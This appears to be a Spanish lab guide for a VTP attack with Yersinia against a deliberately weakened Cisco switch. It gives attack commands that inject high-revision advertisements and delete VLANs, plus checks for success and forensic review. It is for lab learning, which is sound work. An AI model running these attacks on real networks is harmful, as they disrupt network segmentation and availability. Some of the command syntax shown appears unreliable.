# GUÍA DE USO: Ataque VTP con Yersinia

## 📋 Índice
1. [Preparación del Entorno](#preparación-del-entorno)
2. [Instalación de Herramientas](#instalación-de-herramientas)
3. [Configuración del Escenario](#configuración-del-escenario)
4. [Ejecución del Ataque](#ejecución-del-ataque)
5. [Análisis de Resultados](#análisis-de-resultados)
6. [Galería de Imágenes](#galería-de-imágenes)

---

## Preparación del Entorno

### Hardware Necesario
- **Máquina Atacante**: Linux (Ubuntu/Debian) o máquina virtual
- **Switch Víctima**: Cisco (real o emulado en GNS3/Packet Tracer)
- **Red**: Conexión física o simulada entre atacante y switch

### Software Base
```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar dependencias
sudo apt install -y \
    yersinia \
    wireshark \
    libpcap-dev \
    net-tools \
    tcpdump \
    git
```

---

## Instalación de Herramientas

### Opción 1: Instalación desde Repositorio
```bash
# En Debian/Ubuntu
sudo apt-get install yersinia

# Verificar instalación
yersinia --version
```

### Opción 2: Compilación desde Código Fuente
```bash
# Clonar repositorio
git clone https://github.com/tomac/yersinia.git
cd yersinia

# Compilar
./configure
make
sudo make install

# Verificar
yersinia -h
```

---

## Configuración del Escenario

### Paso 1: Topología en GNS3 (Recomendado para Laboratorio)

**Topología Base**:
```
┌─────────────────┐
│  Atacante (PC)  │
│  IP: 192.168.1.10
└────────┬────────┘
         │
    ┌────┴────┐
    │ SWITCH  │
    │ Cisco   │
    │ (Víctima)
    └─────────┘
         │
    ┌────┴────┐
    │ Switch 2 │
    │ (Cliente)│
    └─────────┘
```

### Paso 2: Configuración Vulnerable del Switch Cisco

```cisco
! === Switch 1 (Será Víctima) ===
Switch1# configure terminal
Switch1(config)# vtp mode server
Switch1(config)# vtp domain NETWORK_LAB
! Nota: Sin contraseña VTP o con contraseña débil

Switch1(config)# vlan 10
Switch1(config-vlan)# name Management
Switch1(config-vlan)# vlan 20
Switch1(config-vlan)# name Production
Switch1(config-vlan)# exit

Switch1(config)# interface range GigabitEthernet0/0/1-2
Switch1(config-if-range)# switchport trunk encapsulation dot1q
Switch1(config-if-range)# switchport mode trunk
Switch1(config-if-range)# exit

! === Switch 2 (Cliente) ===
Switch2(config)# vtp mode client
Switch2(config)# vtp domain NETWORK_LAB
```

### Paso 3: Configurar Interfaz de Red del Atacante

```bash
# En la máquina atacante
sudo ip link set eth0 up
sudo ip addr add 192.168.1.10/24 dev eth0

# Verificar conectividad
ping 192.168.1.1  # Dirección del switch
```

---

## Ejecución del Ataque

### Método 1: Modo Interactivo (GUI)

```bash
# Ejecutar Yersinia en modo interactivo
sudo yersinia -G

# O si no está disponible X11:
sudo yersinia -I
```

**Pasos en la interfaz**:
1. Seleccionar protocolo: **VTP**
2. Seleccionar interfaz de red atacante
3. Clic en: **Launch Attack**
4. Seleccionar tipo de ataque:
   - **VLAN Membership Modification**: Cambiar asignación de VLANs
   - **VLAN Deletion**: Eliminar VLANs
   - **VTP Authentication Issue**: Aprovechar falta de autenticación

### Método 2: Modo CLI (Línea de Comandos)

#### Ataque 1: Inyectar Nuevo VTP Server con Revisión Alta

```bash
# Ejecutar Yersinia en modo CLI
sudo yersinia vtp -attack 1 -interface eth0

# Personalización completa:
sudo yersinia vtp \
    -attack 1 \
    -interface eth0 \
    -config domain:NETWORK_LAB,revision:999 \
    -v
```

#### Ataque 2: Advertisements continuos de VTP

```bash
# Enviar advertisements en bucle
for i in {1..10}; do
    sudo yersinia vtp -attack 1 -interface eth0
    sleep 2
done
```

#### Ataque 3: Eliminar VLAN Específica

```bash
# Crafting avanzado con parámetros específicos
sudo yersinia vtp \
    -attack 2 \
    -interface eth0 \
    -config domain:NETWORK_LAB,vlan_name:Production,vlan_id:20,revision:999
```

---

## Análisis de Resultados

### Verificación en el Switch Víctima

```cisco
! Conectar a switch vía consola o SSH

! Ver estado actual de VTP
Switch# show vtp status
VTP Version running               : 2
Configuration Revision Number    : 999        ← Cambió!
Maximum VLANs supported locally  : 4094
Number of existing VLANs         : 23
VTP Operating Mode               : Server
VTP Domain Name                  : NETWORK_LAB
VTP Pruning Mode                 : Disabled
VTP V2 Mode                       : Disabled
VTP Traps Generation             : Enabled
MD5 digest                        : 0x00 0x00 0x00 ...

! Ver base de datos de VLANs
Switch# show vlan brief

! Ver información detallada de VTP
Switch# show vtp counters
```

### Captura de Tráfico con Wireshark

```bash
# Capturar tráfico VTP
sudo tcpdump -i eth0 -w vtp_attack.pcap

# O con Wireshark gráfico
sudo wireshark -i eth0 &

# Filtrar por VTP
tcpdump -i eth0 -A -s 0 'ether proto 0x8100'
```

### Signos de Ataque Exitoso

✅ **Indicadores de Éxito**:
- El número de revisión aumentó del atacante
- La base de datos de VLAN cambió en el switch víctima
- Nuevas VLANs aparecieron o desaparecieron
- El dominio VTP permanece igual en todos los switches

❌ **Señales de Fallo**:
- "VTP error: Password mismatch" → Contraseña VTP activa
- Revisión no aumenta → Switch está en modo Transparent
- Timeout en conexión → Switch bloqueado por MAC filtering

---

## Análisis Forense Posterior al Ataque

### 1. Revisar Logs del Switch

```cisco
Switch# show logging
! Buscar entradas como:
! VTP VLAN database inconsistency detected
! VTP domain mismatch
! Configuration revision mismatch
```

### 2. Salida de Diagnóstico

```bash
# Ver cambios de VLAN en el switch
show vlan summary
show vtp statistics

# Ver quién fue el VTP speaker
show vtp password
! (Si tiene contraseña, el ataque fue detectado)
```

### 3. Análisis de PCAP

```bash
# Abrir captura en Wireshark
wireshark vtp_attack.pcap

# O análisis CLI:
tcpdump -r vtp_attack.pcap -A | grep -i vtp
```

---

## Galería de Imágenes

### Evidencia Fotográfica del Ataque

#### 1. Interfaz Yersinia (Modo Interactivo)
**Archivo**: `imagenes/image_d0dccb.png`

_Descripción_: Captura de pantalla mostrando:
- Selección del protocolo VTP
- Interfaz de red objetivo (eth0)
- Opciones de ataque disponibles
- Ejecución del ataque en tiempo real

**Nota**: Subir captura cuando se ejecute el ataque

#### 2. Configuración del Switch Vulnerable
**Archivo**: `imagenes/image_switch_config.png`

_Descripción_: Terminal del switch mostrando:
- `show vtp status` ANTES del ataque
- VTP Mode: Server
- Domain: NETWORK_LAB
- Revision inicial (ej: 5)

**Nota**: Subir captura antes del ataque

#### 3. Base de Datos VLAN Modificada
**Archivo**: `imagenes/image_vlan_database.png`

_Descripción_: Comparativa:
- **ANTES**: VLANs originales (10, 20, 30)
- **DESPUÉS**: VLANs modificadas/añadidas (nueva VLAN 100)
- Número de revisión modificado (de 5 a 999)

**Nota**: Subir captura después del ataque

#### 4. Captura Wireshark de Tráfico VTP
**Archivo**: `imagenes/image_wireshark_vtp.png`

_Descripción_:
- Filtro: `vtp` en Wireshark
- Tramas VTP interceptadas
- Destino: dirección MAC de broadcast de VTP
- Contenido: Advertisements maliciosas

**Nota**: Subir durante ejecución del ataque

#### 5. Diagrama de Flujo del Ataque
**Archivo**: `imagenes/image_attack_flow.png`

_Descripción_: Diagrama conceptual mostrando:
```
Atacante
   ↓
Yersinia genera VTP Advertisement
   ↓
Inyecta en red (multicast 01:00:0c:cc:cc:cc)
   ↓
Switch recibe advertisement
   ↓
Compara: Revision nueva > Revision actual?
   ↓
SÍ → Acepta cambios de VLAN ✗
NO → Rechaza (Vulnerable: NO)
```

**Nota**: Crear diagrama en formato PNG

#### 6. Historial de Terminal (Ejecución)
**Archivo**: `imagenes/image_terminal_attack.png`

_Descripción_:
```bash
$ sudo yersinia vtp -attack 1 -interface eth0 -v
[*] VTP Attack initialized...
[*] Sending VTP advertisement...
[+] Advertisement sent successfully
[+] Revision number: 999
[+] Domain: NETWORK_LAB
```

**Nota**: Subir captura de terminal mostrando ejecución

---

## 📸 Instrucciones para Subir Imágenes

1. **Tomar las capturas** durante la ejecución del laboratorio
2. **Guardar como**: `imagenes/image_XXXXX.png` (donde XXXXX es nomenclatura aleatoria)
3. **Reemplazar nombres** en esta guía
4. **Opcionales**: Ofuscar IPs/MACs sensibles con Pixelmator o GIMP
5. **Comprimir si es necesario**: Archivos PNG de máx 2MB recomendado

---

## Resolución de Problemas

| Problema | Causa Probable | Solución |
|----------|---------------|----|
| "Permission denied" | No ejecutado con sudo | Usar `sudo yersinia ...` |
| "Interface not found" | Interfaz de red incorrecta | Usar `ip link show` para verificar |
| "VTP error: Password mismatch" | Switch tiene contraseña o modo Transparent | Usar switch vulnerable de laboratorio |
| No hay cambios en VLAN | Switch en modo Transparent o bloqueado | Verificar `show vtp status` |
| Wireshark no captura VTP | Filtro incorrecto | Usar filtro `vtp` exactamente |

---

## Próximos Pasos

1. ✅ Ejecutar ataque múltiples veces para reproducibilidad
2. ✅ Documentar resultados con capturas
3. ✅ Analizar tráfico en Wireshark
4. ✅ Implementar mitigaciones (ver `MITIGACION.md`)
5. ✅ Verificar que defensa bloquea el ataque

---

**Última actualización**: Febrero 2026
